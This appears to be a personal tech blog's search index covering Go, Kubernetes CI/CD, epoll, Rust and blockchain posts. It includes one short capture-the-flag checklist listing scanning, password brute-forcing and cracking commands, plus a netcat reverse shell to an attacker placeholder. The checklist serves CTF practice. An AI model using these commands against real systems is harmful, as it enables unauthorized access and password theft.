[{"content":"Tinyurl Recently, I learned the system design and tried my best to implement a full-stack tinyurl service. Throughout this journey, I also learned how to build a CI/CD pipeline (you can check this posts) and also learned how to use kubernetes.\nArchitecture I built this service on my own server, used nginx to serve static vue frontend.\nI design this system aim to have 100 URLs requents per second, So the shorten name will have 7 characters and generated by use MD5.\nFirst, each api server got a range of number from Zookeeper, and then use that number to generate the MD5 value, this method can guarantee that the hash code won\u0026rsquo;t collision.\nSecond, take the first 7 characters as short name, you need to check whether this short name is existing in the database. If existed in database, just shift a character.\nThird, store into database and redis cache.\nFor get long URL, find in redis cache first. if not found, find in the database.\nDeploy I deployed my service on rancher kubernetes 2.4.16 CI/CD (both frontend and backend) I managed my code in self-hosted gitlab with gitlab-ci.\nbackend frontend Problem   Although I had checked the short name collision, I still got a lot of collision. Then I found it is the api server\u0026rsquo;s problem. A client send request to api server, server will create a thread to handle that request, and use the counter number to compute the hash value. What if 2 thread use counter value simultaneously ? They will use same value to compute short name, and that short name doesn\u0026rsquo;t in database and they will be store in database and redis cache!\nSo I make a mutex lock on counter variable to fix this bug.\n  Vue environment variable disappear when deploy on kubernetes. When I build the docker image of Vue frontend, I can\u0026rsquo;t build it with backend way. In my api server, I can modify environment variable when I deploy the service on Kubernetes. I can input the environment variable in deployment yaml file. But when I do the same thing to Vue frontend docker image. I can not pass the environment variable via deployment yaml. At the end, I found that I should input the environment variable when I build the docker image.\n  Future I want to try to import microservice to this project, or future project.\n","permalink":"https://BWbwchen.github.io/posts/tinyurl/","summary":"Build a Full-Stack Tinyurl service in golang using Gin, Redis, MongoDB and Zookeeper","title":"Tinyurl"},{"content":"Blocking and Non-Blocking When you send a request to server. Server will prepare some data for you (I/O operations). When you wait for data preparation, your program :\n hang up the thread until the server finished the preparation and send response to you. (Blocking) will get response immediately, but you probably got an error, if server hasn\u0026rsquo;t finished the data preparation. Your program need to polling the server and checking error code of each request. But you are not blocked ! (Non-Blocking)  Synchronous and Asynchronous When you send a request to server. Server will prepare some data for you (I/O operations). When you wait for data preparation, your program :\n hand up the thread until the server finished the preparation and send treponse to you. (Synchronous) will get response immediately, but server will run your request in \u0026ldquo;backgroung\u0026rdquo;. When server finished your request, it will notify you, or run the callback function. (Asynchronous)  Non-Blocking I/O in C Normally, you can\u0026rsquo;t read or write directly to disk files. They usually do it via the kernel buffer cache as a proxy. But if you want to read or write directly, use O_SYNC flag when opening the disk file.\nYou can put any file descriptor in the nonblocking mode, just setting the no-delay flag O_NONBLOCK, which is an I/O operating mode, when opening the file.\nReadiness of Descriptors We called it \u0026ldquo;ready\u0026rdquo;. When a file descriptor can perform an I/O operation without blocking, such as the arrival of new input or sock connection establishment etc. There are 2 ways to find out the readiness of descriptors.\nLevel Triggered (select, poll, epoll) (when the condition is met) At any time, we \u0026ldquo;try to\u0026rdquo;(or poll for) perform an I/O operation on an non-blocking descriptor. If the I/O operation blocks, the system call returns an error. If the I/O operation ready, we can actually perform the entire I/O operation or just do nothing.\nEdge Triggered (Asynchronous) (when the status changed) When the I/O operation is ready, it will notify the process or \u0026ldquo;PUSH\u0026rdquo; to the process. The process can attempt to perform the maximum operation it possibly can every time it get a descriptor readiness notification, or it will need to wait until next notification arrival.\nBut even with both 2 non-blocking methods, an extremely large read or write call has the potential to block.\nSelect level triggered mechanism.\nint select( int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout ); Select monitors 3 independent sets of descriptors.\n readfds, check if a read will not block writedfs, check if a write will not block exceptfds, monitored for exceptional conditions.  Poll But what if you want not just read, write or exceptional conditions ? Use poll ! we pass in a set of descriptors each marked event that it needs to track.\nint poll(struct pollfd *fds, nfds_t nfds, int timeout); struct pollfd { int fd; /* file descriptor */ short events; /* requested events */ short revents; /* returned events */ }; Epoll (event poll) Epoll instance is a kernel data structure. It allows for a process to monotor multiplex I/O on mltiple descriptors. You have 3 system call to control epoll instance :\nepoll_create() #include \u0026lt;sys/epoll.h\u0026gt; int epoll_create(int size); The size augrument, which is the number of descriptors, is ignored since Linux 2.6.8.\n#include \u0026lt;sys/epoll.h\u0026gt; int epoll_create1(int flags); flags can only be either 0 or EPOLL_COLEXEC.\n flags is 0, it is the same as epoll_create(). flags is EPOLL_COLEXEC, it will set close-on-exec flag on the new file descriptor.  epoll_ctl() #include \u0026lt;sys/epoll.h\u0026gt; int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event); It preformed op on target fd in epfd with event\nop  EPOLL_CTL_ADD EPOLL_CTL_MOD EPOLL_CTL_DEL  events typedef union epoll_data { void *ptr; int fd; uint32_t u32; uint64_t u64; } epoll_data_t; struct epoll_event { uint32_t events; /* Epoll events */ epoll_data_t data; /* User data variable */ }; events is just a bitmask that indicates which events fd is being monitored for. For example:\nEPOLLIN : The associated file is available for read operations. EPOLLOUT : The associated file is available for write operations. If you want to perform multiple events, just OR-ing them.\nepoll_wait() #include \u0026lt;sys/epoll.h\u0026gt;int epoll_wait(int epfd, struct epoll_event *eventlist, int maxevents, int timeout); blocks until any descriptor being monitored become ready for I/O\nThe bowels of epoll In process Let\u0026rsquo;s first learn how the descriptor works. I create a file descriptor in process A, I will get a file descriptor. The system will store the descriptor and it\u0026rsquo;s file pointer in a table in my process A. Every entry in this table has 2 fields :\n descriptor flags. file pointer, point to an underlying kernel open file table. indexed by descriptor.  In kernel Each file pointer point to an entry in kernel open file table. each entry in kernel open file table has 3 fields :\n file offset status flags inode pointer.  In filesystem Then each inode pointer point to an entry in filesystem inode table. each entry in filesystem inode table has some fields :\n file type. file locks. etc.  How epoll works process A call epoll_create() to create an epoll instance. The system will create an entry in kernel open file table, and it point to an entry in inode table. secondly, process A call epoll_ctl() to add a file descriptor fd0 to the epoll instance\u0026rsquo;s interset list. The system will point the fd0 in epoll instance to fd0 in kernel open file table (NOTICE: the kernel open file table entry is shared by referenced descriptor !!)\nexample Consider the situation above, process A fork process B without close-on-exec, process B will have table as same as process B. for example, process A have fd0 and fork process B, it have a descriptor fd1. But fd0 and fd1 point to the same underlying kernel open file table entry.\nFork epoll So same case, but the fd0 and fd1 in the above case is epoll descriptor. process A call epoll_wait(), after a moment it got notifications. But at the same time, process B will also got the notifications !!!\nSo we can say once a file descriptor is registered by a process with the epoll instance, it will continue getting notifications about events on the descriptor even if it closes the descriptors as long as the underlying open file descriptor is still referenced by at least one descriptor.\nPerformance Select and poll are O(N) (or O(number of descriptors being monitored)), but epoll is O(1) (or O(number of events that have occurred)). Because every time the descriptor become ready, kernel will add it into the ready list in epoll instance. Once process call epoll_wait(), just return the ready list.\n","permalink":"https://BWbwchen.github.io/posts/http_server_in_go/","summary":"let\u0026rsquo;s study about epoll, blocking and non-blocking","title":"Epoll study"},{"content":"Motivation During the internship at Logitech, I refactor and optimize the internal test tool. When I finished the coding, my manager ask me to write a detailed document to record the core logic in this test tool.\nWhen I wrote the document, my manager ask me to use MOSCOW notation to list down the requirements of this test tool.\nBut, What is MOSCOW notation ? ðŸ¤”\nMeaning MoSCoW is an acronym derived from four letters of each prioritization : M for MUST HAVE, S for SHOULD HAVE, C for COULD HAVE and W for WON\u0026rsquo;T HAVE. It didn\u0026rsquo;t have O, just for word pronounceable.\nExample So when I write a test tool(prime detector) to detect prime number and composite number and we plan to detect floating point in the future, I will need to write the below requirement.\nPRIMEDETECTOR-1: MUST detect the prime number. PRIMEDETECTOR-2: MUST detect the composite number. PRIMEDETECTOR-3: SHOULD detect the floating point. ","permalink":"https://BWbwchen.github.io/posts/moscow_notation/","summary":"What is MOSCOW notation?","title":"Moscow_notation"},{"content":"Recently, I have been writting a tinyURL service with a CI/CD pipeline on self-hosted gitlab. I want to record this horrible and time-consuming self-taught journey.\nOur CI/CD pipeline will be composed with test, build and deploy. We first test the code, check whether there is any mistake in our code logic. Second, we build it to binary. Finally, we deploy our binary on the cloud or your own kubernetes.\nEnvironment  golang 1.16.5 docker 20.10.7 docker-compose 1.29.2 rancher 2.4.16 gitlab-runner with docker executor  tinyURL tinyURL was written for self-taught with backend developement, kubernetes, docker and DevOps. User will give the service a longURL. Service will give back the short name of that URL. Once user query the service with the short name, service will need to give back the original long URL. for more info, check this\nThis is the overview architecture: Test on Local Notice that the whole system comprises 4 main module: api server, redis service, mongodb service and Zookeeper service. So I choose docker-compose to build a testing environment. Let\u0026rsquo;s check the setting yaml file:\nversion: \u0026#34;3\u0026#34; services: server: container_name: myshorturl image: shorturl_test ports: - 8081:8081 environment: REDIS_URL: redis:6379 DB_URL: db:27017 ZOOKEEPER_URL: zookeeper:2181 PORT: 8081 depends_on: - redis - db - zookeeper redis: container_name: redis image: redis:alpine expose: - 6379 db: container_name: monogodb image: mongo:4.0.26-xenial expose: - 27017 zookeeper: container_name: zookeeper image: zookeeper:3.7.0 expose: - 2181 There are 3 things to notice:\n Firstly, Make sure the version number is 3, or it will fail in the testing pipeline. Secondly, if api server want to connect with other service, connect the service name directly. eg: How to connect db ? just \u0026lt;dbprotocol\u0026gt;://db, such like : postgresql://db Lastly, the difference between ports and expose.  Ports will expose the port number and also publish them to the host machine. Expose will expose the port between the containers, it will not publish the port to the host machine.    Then run with command (it will shutdown containers automatically, if api-server finished test):\n$ docker-compose up --abort-on-container-exit --exit-code-from server Test test-job: stage: test before_script: - apk add docker-compose - docker build -f Dockerfile-ci --tag shorturl_test . script: - docker-compose up --abort-on-container-exit --exit-code-from server Since we use gitlab-runner docker executor with docker:stable image as default image, it only provide docker command. You can check the official documentation. We need to install the docker-compose command for testing. use apk to install it. Then build a docker image for golang testing command.\n# Dockerfile-ciFROMgolang:1.16WORKDIR/appCOPY . .CMD [ \u0026#34;go\u0026#34;, \u0026#34;test\u0026#34;, \u0026#34;-v\u0026#34; Build build-job: image: name: gcr.io/kaniko-project/executor:debug entrypoint: [\u0026#34;\u0026#34;] stage: build script: - mkdir -p /kaniko/.docker - echo \u0026#34;{\\\u0026#34;auths\\\u0026#34;:{\\\u0026#34;$DOCKER_REGISTRY\\\u0026#34;:{\\\u0026#34;username\\\u0026#34;:\\\u0026#34;${DOCKER_REGISTRY_USER}\\\u0026#34;,\\\u0026#34;password\\\u0026#34;:\\\u0026#34;${DOCKER_REGISTRY_PASSWORD}\\\u0026#34;}}}\u0026#34; \u0026gt; /kaniko/.docker/config.json - /kaniko/executor --context $CI_PROJECT_DIR --dockerfile $CI_PROJECT_DIR/Dockerfile --destination $DOCKER_IMAGE We use pre-build image to handle this stage.\nDeploy Now, We will try to deploy our service on kubernetes. I use rancher for kubernetes.\nThere are some things need to sure.\n kubeconfig file. docker registry username, password  First, deploy a deployment on kubernetes. So we can automatically deploy the next job trigger.\ndeploy-job: stage: deploy image: dtzar/helm-kubectl before_script: - sed -ie \u0026#34;s/deploy-date-value/$(date)/g\u0026#34; kubernetes/deploy.yaml - mkdir -p /root/.kube/ \u0026amp;\u0026amp; touch /root/.kube/config - echo ${KUBERNETES_KUBE_CONFIG} | base64 -d \u0026gt; ${KUBECONFIG} script: - kubectl apply -f kubernetes/deploy.yaml I use deply-date-value as a trigger to trigger the deployment update.\nFinal The CI/CD pipeline should run successfully ! Hooray ! ðŸŽ‰\nIf you have other problem, feel free to ask me !\nYou can find me here ðŸ‘‰ tim.chenbw@gmail.com\n","permalink":"https://BWbwchen.github.io/posts/shorturlcicd/","summary":"CI/CD on gitlab-ci with kubernetes","title":"CI/CD on gitlab-ci"},{"content":"Let\u0026rsquo;s check this example :\ntype SQL struct { table SQL.table } We want CRUD (create, read, update, delete) operation. So you might write the code like this :\npackage main import \u0026#34;fmt\u0026#34; type SQL struct { table string } func (s SQL) Create () { fmt.Println(\u0026#34;Create\u0026#34;) } func (s SQL) Read () { fmt.Println(\u0026#34;Read\u0026#34;) } func (s SQL) Update (criteria string) { fmt.Println(\u0026#34;Update\u0026#34;, criteria) } func (s SQL) Delete (criteria string) { fmt.Println(\u0026#34;Delete\u0026#34;, criteria) } type ORM interface{ Create() Read() Update(string) Delete(string) } func main() { sqldb := SQL{\u0026#34;table\u0026#34;} var db ORM = sqldb db.Create() db.Read() db.Update(\u0026#34;record\u0026#34;) db.Delete(\u0026#34;table\u0026#34;) } But you can notice that what if the operations were more than that ? We will get bunch of SQL member method ! We want to write \u0026ldquo;Clean Code\u0026rdquo;. We should follow the \u0026ldquo;Single-responsibility principle\u0026rdquo;(SRP) to design a more readable code. Struct SQL has deal with too many things ! We can try to make Create as a single struct, Read as a single struct. So each struct just do exactly one things. Let\u0026rsquo;s try the concept of inheritance\nInheritance in Golang :\npackage main import \u0026#34;fmt\u0026#34; type SQL struct { table string } type CreateSql struct { SQL } func (c CreateSql) Operate () { fmt.Println(\u0026#34;Create\u0026#34;) } type ReadSql struct { SQL } func (s ReadSql) Operate () { fmt.Println(\u0026#34;Read\u0026#34;) } type UpdateSql struct { SQL } func (s UpdateSql) Operate (criteria string) { fmt.Println(\u0026#34;Update\u0026#34;, criteria) } type DeleteSql struct { SQL } func (s DeleteSql) Operate (criteria string) { fmt.Println(\u0026#34;Delete\u0026#34;, criteria) } type ReadOnlyORM interface{ Operate() } type SideEffectORM interface{ Operate(string) } func main() { dbCreate := CreateSql{SQL{\u0026#34;table\u0026#34;}} dbRead := ReadSql{SQL{\u0026#34;table\u0026#34;}} dbUpdate := UpdateSql{SQL{\u0026#34;table\u0026#34;}} dbDelete := DeleteSql{SQL{\u0026#34;table\u0026#34;}} var read_only_orm ReadOnlyORM read_only_orm = dbCreate read_only_orm.Operate() read_only_orm = dbRead read_only_orm.Operate() var side_effect_orm SideEffectORM side_effect_orm = dbUpdate side_effect_orm.Operate(\u0026#34;test\u0026#34;) side_effect_orm = dbDelete side_effect_orm.Operate(\u0026#34;table\u0026#34;) } Now we make each struct just do only one thing. If Update operation has Bug, we can just modified UpdateSql struct without affecting other method.\nBut it seems like bringing owls to Athens for such little program. Maybe it is a good method, when the code is larger, not just 60 lines.\n","permalink":"https://BWbwchen.github.io/posts/gooop/","summary":"CRUD with clean code by using Go embed struct","title":"Go interface for inheritance"},{"content":"We can think of struct as a wrapper of object. You can also check Golang spec (struct).\ntype TestStruct struct { Interger int String string Bool bool SomeWeirdInterface interface{} OtherStruct // we call it embedded field } type OtherStruct struct { Hello string } We use Interface to group a set of method. You can think it as a list that all structs that have implemented the required method. If you missing one of the method, you can not in that interface.\nYou can also check Golang spec (interface).\ntype Human struct { name string } type Student struct { Human job string } type Worker struct { Human job string salary int } func (h Human) Info() { fmt.Printf(\u0026#34;I am %s\\n\u0026#34;, h.name) } func (s Student) Info () { fmt.Printf(\u0026#34;I am %s. I am a %s.\\n\u0026#34;, s.name, s.job) } func (w Worker) Info () { fmt.Printf(\u0026#34;I am %s. I am a %s. I have %d salary\\n\u0026#34;, w.name, w.job, w.salary) } type Person interface { Info() } with main function :\nfunc main() { Tom := Student{Human{\u0026#34;Tom\u0026#34;}, \u0026#34;student\u0026#34;} Ben := Worker{Human{\u0026#34;Ben\u0026#34;}, \u0026#34;worker\u0026#34;, 1000} Susan := Human{\u0026#34;Susan\u0026#34;} Tom.Info() Ben.Info() Susan.Info() var i Person // Becaus Student and Worker and Human all have implemented Info method  i = Tom i.Info() i = Ben i.Info() i = Susan i.Info() } We can see that Student, Worker, Human all have implemented the Info method, so the variabe i with type person interface will work well.\nI am Tom. I am a student. I am Ben. I am a worker. I have 1000 salary I am Susan I am Tom. I am a student. I am Ben. I am a worker. I have 1000 salary I am Susan But what if I change the Human method to Hi() ?\ncannot use Susan (type Human) as type Person in assignment: Human does not implement Person (missing Info method) ","permalink":"https://BWbwchen.github.io/posts/gostructinterface/","summary":"Struct wrap things, Interface make a member-required function list","title":"Go Struct and Interface"},{"content":"Write an OS in Rust First, we need to make a bare metal executable.\nBare Metal executable in Rust In Rust, We need to turn off the std lib with #![no_std] . But This is leed to this :\nerror: `#[panic_handler]` function required, but not found  error: language item required, but not found: `eh_personality` error: aborting due to 2 previous errors error: could not compile `os` To learn more, run the command again with --verbose. #[panic_handler]  #[panic_handler] is used to define the behavior of panic! in #![no_std] applications. \u0026ndash; The Rustonomicon\n It define the function that compiler should invoke when panic occurs.\nJust add this for convenient :\n#![no_std] use core::panic::PanicInfo; #[panic_handler] fn panic(_info: \u0026amp;PanicInfo) -\u0026gt; ! { loop {} } language item and eh_personality  The compiler currently makes a few assumptions about symbols which are available in the executable to call. Normally these functions are provided by the standard library, but without it you must define your own. These symbols are called \u0026ldquo;language items\u0026rdquo;, and they each have an internal name, and then a signature that an implementation must conform to.\n There are 3 language item symbols :\n rust_eh_personality : for failure mechanisms. rust_begin_panic : for failure mechanisms to display message on the screen. eh_catch_typeinfo : I don\u0026rsquo;t understand\u0026hellip;  Unwind When panic occurs, how do we cleanup the stack frame and handle it ? Use eh_personality ! It define how to run the destructor when panic occurs.\nHere, We use abort on panic, we don\u0026rsquo;t need to generate the unwind information and thus reduce the binary size.\nAdd below in Cargo.toml\n[profile.dev] panic = \u0026#34;abort\u0026#34; [profile.release] panic = \u0026#34;abort\u0026#34; The stragedy of panic is abort.\n Build it again ! ERROR !! NO~~~\nerror: requires `start` lang_item start attribute Which function should be called first ? A typical Rust binary that links the standard library first start in crt0(C runtime zero), which sets up the environment for a C application. The C runtime then invoke the entry point of Rust, which marked by start lang_item.\nIn this project, we need our own entry point, we don\u0026rsquo;t want to use crt0.\n#[no_mangle] pub extern \u0026#34;C\u0026#34; fn _start() -\u0026gt; ! { loop {} }  Linker error Compiler default think that our binary is depend on C runtime, but since we use our entry point, compiler doesn\u0026rsquo;t know what to do.\nchange compile command to :\ncargo build --target thumbv7em-none-eabihf ","permalink":"https://BWbwchen.github.io/posts/os_in_rust/","summary":"write an os in rust","title":"Os_in_rust"},{"content":"Block Chain Basic Chain for one block we record its :\n Index (the i th block in this chain) Timestamp Data The hash value of previous block Hash value of this block  Block Chain Network  accept imcoming data, and build a block broadcast the chain to all network within a time interval  Mining Algorithm - Proof of Work(used by Bitcoin) Algorithm ask the miner to done some \u0026ldquo;work\u0026rdquo;, and competed with other miners who were also do the same \u0026ldquo;work\u0026rdquo;.\nWork \u0026ldquo;Work\u0026rdquo; is all about cryptography and hashing.\nOne-way cryptography One-way cryptography take an input and applied it with a function to produce an indecipherable output. If you input the same data, the output of the crypto algorithm should give you the same output(idempotency).\n\u0026ldquo;Work\u0026rdquo; : participants hashed many combination of letters and numbers to produce the specific number of leading 0's.\nCheck whether you find the answer is easy, just hash it. So the winner miner can earn the bitcoin by proving you done the \u0026ldquo;work\u0026rdquo;. \u0026mdash;Proof-of-Work\nOf course, we can change the requirement of the numbers of leading 0\u0026rsquo;s dynamically to make sure the work won\u0026rsquo;t too easy. \u0026mdash;adjusting the difficulty\nimplementation Use Timestamp and all data in block to calculate hash to finish the work.\nMining Algorithm - Proof of Stake Proof of Work will consume lots of energy, as the difficulty of mining grows the higher energy it waste.\nWhat is \u0026ldquo;stake\u0026rdquo; meaning ? You can think word \u0026ldquo;stake\u0026rdquo; as how much money you have. In this mining algorithm, we pick winner base on miner\u0026rsquo;s money, the more money you have the higher possibility that you been picked.\nP2P Block Chain this website\nProblem Mining is on server ? or client ? decentralization ? ","permalink":"https://BWbwchen.github.io/posts/block_chain/","summary":"block chain tutorial","title":"Block chain"},{"content":"Root me  nmap the ip address  nmap -sC -sV \u0026lt;ip_addr\u0026gt; nikto to find vulnerability  nikto -h \u0026lt;url\u0026gt; gobuster to brute-force directory  gobuster dir -u \u0026lt;url\u0026gt; -w \u0026lt;wordlist\u0026gt; brute-force the ssh password : hydra  hydra -l \u0026lt;user_name\u0026gt; -P \u0026lt;word_list\u0026gt; \u0026lt;protocol\u0026gt;://\u0026lt;ip_addr\u0026gt; john the ripper  john \u0026lt;encrypted\u0026gt; --wordlist=\u0026lt;word_list\u0026gt; (--format=\u0026lt;format\u0026gt;) reverse shell  nc \u0026lt;attacker_ip\u0026gt; \u0026lt;port\u0026gt; -e /bin/bash # target machine nc -lvp \u0026lt;port\u0026gt; # attacker machine reverse shell send file (ex: send linpeas.sh)  nc -l -p \u0026lt;port\u0026gt; \u0026gt; \u0026lt;file\u0026gt; \u0026lt; /dev/null # target machine cat \u0026lt;file\u0026gt; | nc \u0026lt;target_ip\u0026gt; \u0026lt;port\u0026gt; # attacker machine linpeas.sh to find privilege escalation   gtfobins is good  ","permalink":"https://BWbwchen.github.io/posts/ctf_rootme_process/","summary":"Root me process","title":"CTF rootme process"},{"content":"C++ bit field When I reading the source code of gameboy-emulator, I saw this weird code.\nunsigned unused : 4; unsigned c : 1; /* Carry flag */ unsigned h : 1; /* Half carry flag */ unsigned n : 1; /* Add/sub flag */ unsigned z : 1; /* Zero flag */ The meaning of : It specifies the length in bits of each field.\nHere is an example :\n","permalink":"https://BWbwchen.github.io/posts/note/bit_field/","summary":"C++ bit field usage","title":"C++ bit field"},{"content":"","permalink":"https://BWbwchen.github.io/search/","summary":"","title":"Search"},{"content":"","permalink":"https://BWbwchen.github.io/archives/","summary":"archives","title":"Archive"}]